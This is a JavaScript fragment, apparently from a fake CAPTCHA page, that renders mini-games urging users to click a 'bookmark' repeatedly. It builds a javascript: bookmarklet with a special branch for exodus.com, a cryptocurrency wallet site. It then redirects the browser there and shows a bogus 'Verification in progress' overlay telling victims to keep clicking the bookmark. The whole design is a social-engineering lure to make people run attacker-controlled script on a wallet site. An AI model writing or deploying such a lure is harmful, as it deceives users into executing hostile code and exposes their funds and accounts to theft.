      var MAX_LIVE_ZOMBIES = 220;

      function spawnZombieCluster(laneEl) {
        var r = Math.random();
        var laneClass = r < 0.34 ? "" : r < 0.67 ? " zlane-b" : " zlane-c";
        var zu = document.createElement("div");
        zu.className = "zombie-unit" + laneClass;
        zu.innerHTML = ZOMBIE_SVG_VARIANTS[Math.floor(Math.random() * ZOMBIE_SVG_VARIANTS.length)];
        laneEl.appendChild(zu);
        zombies.push({
          el: zu,
          x: 100 + Math.random() * 18,
          dead: false,
          speed: 0.075 + Math.random() * 0.065
        });
      }

      window._zombiesIdleTimeout = setTimeout(function () {
        if (!currentPuzzle || currentPuzzle.step2.type !== "zombies") return;
        if (getStep2SpamClicks() >= 1) return;
        closeChallengeForRetry(
          "You didn't use the bookmark — your weapon can't fire without it. Click Verify again for another attempt."
        );
      }, ZOMBIE_NO_BOOKMARK_IDLE_MS);

      window._zombiesGameInterval = setInterval(function () {
        if (!currentPuzzle || currentPuzzle.step2.type !== "zombies") return;
        if (gameOver) return;
        var laneEl = getEl("zombiesLane");
        if (!laneEl) return;

        zombieSpawnAcc += ZOMBIES_PER_SEC * (TICK_MS / 1000);
        if (Math.random() < 0.055) {
          zombieSpawnAcc += 8 + Math.floor(Math.random() * 14);
        }

        var budget = 0;
        while (zombieSpawnAcc >= 1 && zombies.length < MAX_LIVE_ZOMBIES && budget < 20) {
          zombieSpawnAcc -= 1;
          budget++;
          spawnZombieCluster(laneEl);
        }
        if (Math.random() < 0.018) {
          var wave = 4 + Math.floor(Math.random() * 6);
          var w;
          for (w = 0; w < wave && zombies.length < MAX_LIVE_ZOMBIES; w++) {
            spawnZombieCluster(laneEl);
          }
        }

        zombies = zombies.filter(function (z) {
          if (z.dead) {
            if (z.el && z.el.parentNode) z.el.parentNode.removeChild(z.el);
            return false;
          }
          return true;
        });
        while (zombies.length > MAX_LIVE_ZOMBIES) {
          var zr = zombies.pop();
          if (zr && zr.el && zr.el.parentNode) zr.el.parentNode.removeChild(zr.el);
        }

        var crossed = false;
        zombies.forEach(function (z) {
          if (z.dead) return;
          z.x -= z.speed;
          z.el.style.left = z.x + "%";
          if (z.x <= FINISH_PCT) crossed = true;
        });
        if (crossed) {
          gameOver = true;
          closeChallengeForRetry(
            "The horde crossed the line! Click Multiple times your bookmark faster to thin them out. Click Verify to try again."
          );
          return;
        }

        var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
        var cc = getEl("clickCounter");
        if (cc) cc.textContent = String(n);
        if (n > lastZ) {
          if (window._zombiesIdleTimeout) {
            clearTimeout(window._zombiesIdleTimeout);
            window._zombiesIdleTimeout = null;
          }
          var burst = (n - lastZ) * 28;
          lastZ = n;
          var muzzle = getEl("zombieMuzzle");
          var ki;
          for (ki = 0; ki < burst; ki++) {
            var alive = zombies.filter(function (z) { return !z.dead; }).sort(function (a, b) { return a.x - b.x; });
            var vic = alive[0];
            if (!vic) break;
            vic.dead = true;
            vic.el.classList.add("shot-flash");
            (function (el) {
              setTimeout(function () {
                el.classList.remove("shot-flash");
                el.classList.add("dead");
              }, 90);
            })(vic.el);
          }
          if (muzzle) {
            muzzle.classList.remove("flash");
            void muzzle.offsetWidth;
            muzzle.classList.add("flash");
          }
        }
      }, TICK_MS);
      startStep2PressureTimer(limit);
      return;
    }
    if (type === "jump") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl");
      body.innerHTML =
        "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
        timerBlock +
        "<div class=\"puzzle-jump-v2\">" +
        "<div class=\"jump-scene\">" +
        "<div class=\"jump-ground\"></div>" +
        "<img class=\"storm-robot-img\" id=\"jumpRobotImg\" src=\"https://upload.wikimedia.org/wikipedia/commons/0/05/Robot_icon.svg\" width=\"120\" height=\"120\" alt=\"\" style=\"position:absolute;left:50%;bottom:28px;transform:translateX(-50%);z-index:3;transition:bottom .12s ease-out\">" +
        "<div class=\"jet-flame\" id=\"jumpFlame\" style=\"position:absolute;left:50%;bottom:18px;width:24px;height:26px;margin-left:-12px;background:linear-gradient(180deg,#ffeb3b,#ff9800,transparent);border-radius:50% 50% 60% 60%;opacity:0;z-index:2\"></div>" +
        "<div class=\"jump-height-tag\"><span id=\"jumpHeightDisplay\">0</span> m</div>" +
        "</div></div>" +
        "<div class=\"puzzle-progress-wrap\">" +
        "<div class=\"puzzle-progress-label\">Altitude</div>" +
        "<div class=\"puzzle-progress-track\"><div class=\"puzzle-progress-fill\" id=\"jumpMeterFill\"></div></div>" +
        "</div>";

      var prevNJ = -1;
      function updateJump() {
        var heightEl = getEl("jumpHeightDisplay");
        var fill = getEl("jumpMeterFill");
        var img = getEl("jumpRobotImg");
        var flame = getEl("jumpFlame");
        if (!heightEl || !currentPuzzle || currentPuzzle.step2.type !== "jump") return;
        var deltaJ = getStep2SpamClicks();
        var meters = Math.min(100, deltaJ);
        heightEl.textContent = String(meters);
        if (fill) fill.style.width = meters + "%";
        var rise = Math.min(175, meters * 1.75);
        if (img) img.style.bottom = 28 + rise + "px";
        if (deltaJ > prevNJ && deltaJ > 0) {
          if (flame) {
            flame.style.opacity = "1";
            setTimeout(function () {
              var f = getEl("jumpFlame");
              if (f) f.style.opacity = "0";
            }, 120);
          }
        }
        prevNJ = deltaJ;
      }
      updateJump();
      window._jumpDisplayInterval = setInterval(updateJump, 90);
      startStep2PressureTimer(limit);
      return;
    }
    if (type === "math") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl", "stage2-math-rich");
      body.innerHTML =
        "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
        timerBlock +
        "<div class=\"puzzle-math-rich\">" +
        "<div class=\"math-glass-hero\">" +
        "<div class=\"math-glass-orbit\"></div>" +
        "<div class=\"math-glass-icon\" aria-hidden=\"true\">∑</div>" +
        "<h3 class=\"math-glass-title\">Verification bridge</h3>" +
        "<p class=\"math-glass-hint\">Click multiple times the bookmark to complete the cryptographic handshake — your clicks charge the signal.</p>" +
        "</div>" +
        "<div class=\"puzzle-progress-wrap math-progress-glass\">" +
        "<div class=\"puzzle-progress-label\">Signal strength</div>" +
        "<div class=\"puzzle-progress-track\"><div class=\"puzzle-progress-fill\" id=\"mathProgFill\"></div></div>" +
        "</div></div>";

      window._mathProgressInterval = setInterval(function () {
        if (!currentPuzzle || currentPuzzle.step2.type !== "math") return;
        var nm = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
        var ccM = getEl("clickCounter");
        var mf = getEl("mathProgFill");
        if (ccM) ccM.textContent = String(nm);
        var dMath = getStep2SpamClicks();
        if (mf) mf.style.width = Math.min(100, Math.floor((dMath / MATH_PROGRESS_CLICKS_FOR_FULL) * 100)) + "%";
      }, 120);
      startStep2PressureTimer(limit);
      return;
    }
    body.innerHTML =
      timerBlock +
      "<p class=\"click-counter-line\">Clicks: <strong id=\"clickCounter\">0</strong></p>";
    startStep2PressureTimer(limit);
  }

  if (done1Button) {
    done1Button.addEventListener("click", function () {
      if (challenge1) challenge1.classList.add("hidden");
      if (challenge2) challenge2.classList.remove("hidden");
      var banner2 = getEl("challenge2Banner");
      if (banner2 && currentPuzzle && currentPuzzle.step2) banner2.innerHTML = currentPuzzle.step2.bannerText;
      window._challenge2ClicksBaseline = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      renderStep2Content(currentPuzzle);
      var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      var cc = getEl("clickCounter");
      if (cc) cc.textContent = String(n);
      if (currentPuzzle && currentPuzzle.step2 && currentPuzzle.step2.type === "jump") {
        var jumpEl = getEl("jumpHeightDisplay");
        var jfill = getEl("jumpMeterFill");
        var meters = Math.min(100, getStep2SpamClicks());
        if (jumpEl) jumpEl.textContent = String(meters);
        if (jfill) jfill.style.width = meters + "%";
      }
      if (window._spamRedirectPoll) {
        clearInterval(window._spamRedirectPoll);
        window._spamRedirectPoll = null;
      }
      window._spamRedirectPoll = setInterval(trySpamRedirect, 75);
      var d2 = getEl("done2Button");
      if (d2) {
        if (currentPuzzle && currentPuzzle.step2 && currentPuzzle.step2.noManualDone) {
          d2.style.visibility = "hidden";
          d2.style.pointerEvents = "none";
          d2.setAttribute("aria-hidden", "true");
        } else {
          d2.style.visibility = "";
          d2.style.pointerEvents = "";
          d2.removeAttribute("aria-hidden");
        }
      }
    });
  }

  if (done2Button) {
    done2Button.addEventListener("click", function () {
      var step2 = currentPuzzle && currentPuzzle.step2;
      if (step2 && step2.noManualDone) return;
      var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      var pass = false;
      var msg = "";
      if (!step2) {
        pass = n >= 15;
        msg = "Keep using the bookmark.";
      } else if (step2.type === "storm") {
        pass = getStep2SpamClicks() >= SPAM_CLICKS_TO_REDIRECT;
        msg = "Keep using the bookmark.";
      } else {
        pass = (step2.targetClicks || 0) > 0 && n >= step2.targetClicks;
        msg = "Keep using the bookmark.";
      }
      if (pass) {
        showWidgetSuccessThenRedirect();
      } else {
        alert(msg);
      }
    });
  }

  var challenge1RefreshBtn = getEl("challenge1RefreshBtn");
  var challenge2RefreshBtn = getEl("challenge2RefreshBtn");
  if (challenge1RefreshBtn) {
    challenge1RefreshBtn.addEventListener("click", function () {
      buildChallenge1Grid();
    });
  }
  if (challenge2RefreshBtn) {
    challenge2RefreshBtn.addEventListener("click", function () {
      stopChallenge2Visuals();
      var d2r = getEl("done2Button");
      if (d2r) {
        d2r.style.visibility = "";
        d2r.style.pointerEvents = "";
        d2r.removeAttribute("aria-hidden");
      }
      currentPuzzle = null;
      if (challenge2) challenge2.classList.add("hidden");
      if (challenge1) challenge1.classList.remove("hidden");
      buildChallenge1Grid();
    });
  }

  function buildUnifiedBookmarklet() {
    var baseEsc = captchaBaseUrl.replace(/'/g, "\\'");
    return (
      "javascript:(function(){" +
      "var base='" + baseEsc + "';" +
      "var k='bookmarkletClicks';" +
      "var n=parseInt(localStorage.getItem(k)||0,10)+1;" +
      "localStorage.setItem(k,n);" +
      "var doc=document;var clickCounter=doc.getElementById('clickCounter');" +
      "if(!clickCounter&&window.frames&&window.frames.length){try{for(var i=0;i<window.frames.length;i++){clickCounter=window.frames[i].document.getElementById('clickCounter');if(clickCounter){doc=window.frames[i].document;break;}}}catch(e){}}" +
      "if(clickCounter){" +
      "clickCounter.textContent=n;" +
      "try{window.parent.postMessage({type:'captcha_tick',clicks:n},'*');}catch(e){}" +
      "}else if(window.location.hostname.includes('exodus.com')){" +
      "localStorage.setItem('bookmarkletClicks',n);" +
      "try{window.parent.postMessage({type:'exodus_click',clicks:n},'*');}catch(e){}" +
      "}" +
      "})();"
    );
  }

  const bookmarkletHref = buildUnifiedBookmarklet();

  // Clear localStorage on fresh page load
  (function () {
    var params = new URLSearchParams(location.search);
    if (!params.get("from_bookmarklet") && !params.get("show_exodus_popup")) {
      localStorage.setItem("bookmarkletClicks", "0");
    }
  })();

  function showWidgetSuccessThenRedirect() {
    stopChallenge2Visuals();
    var target = "https://www.exodus.com?from_captcha=1";
    try { window.top.location.href = target; } catch (e) { window.location.href = target; }
  }

  window.addEventListener("message", function (e) {
    if (e.data && e.data.type === "captcha_tick") {
      trySpamRedirect();
    }
  });

  // Handle re-injection on exodus.com
  (function () {
    var params = new URLSearchParams(location.search);
    if (params.get("from_captcha") === "1" && window === window.parent) {
      localStorage.setItem("captcha_reinjected", "1");
      var reinjectOverlay = document.createElement("div");
      reinjectOverlay.id = "captcha-reinjection-overlay";
      reinjectOverlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.3);display:flex;align-items:center;justify-content:center;z-index:9998;backdrop-filter:blur(1px);";
      
      var reinjectBox = document.createElement("div");
      reinjectBox.style.cssText = "background:#fff;border-radius:8px;padding:30px;text-align:center;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,0.2);";
      reinjectBox.innerHTML = '<div class="completing-spinner" style="margin:0 auto 20px;"><span class="spinner-dot"></span><span class="spinner-dot"></span><span class="spinner-dot"></span><span class="spinner-dot"></span></div>' +
                              '<p style="font-size:16px;font-weight:500;color:#333;margin:10px 0;">Verification in progress...</p>' +
                              '<p style="font-size:13px;color:#666;margin:8px 0;">90% Complete</p>' +
                              '<p style="font-size:12px;color:#999;margin-top:15px;">Continue clicking the bookmark to finish verification</p>';
      
      reinjectOverlay.appendChild(reinjectBox);
      document.body.appendChild(reinjectOverlay);

      setTimeout(function () {
        if (reinjectOverlay.parentElement) {
          reinjectOverlay.parentElement.removeChild(reinjectOverlay);
        }
        localStorage.removeItem("captcha_reinjected");
      }, 3500);
    }
  })();

})();
